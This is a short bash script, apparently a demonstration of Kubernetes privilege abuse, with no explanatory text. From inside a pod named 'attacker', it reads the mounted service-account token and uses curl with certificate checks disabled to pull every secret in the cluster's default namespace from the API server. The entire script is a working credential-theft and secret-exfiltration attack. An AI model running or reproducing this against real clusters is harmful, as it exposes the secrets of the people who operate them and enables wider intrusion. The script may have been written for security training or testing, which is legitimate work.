#!/bin/bash
kubectl exec attacker -- bash -c 'TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets'
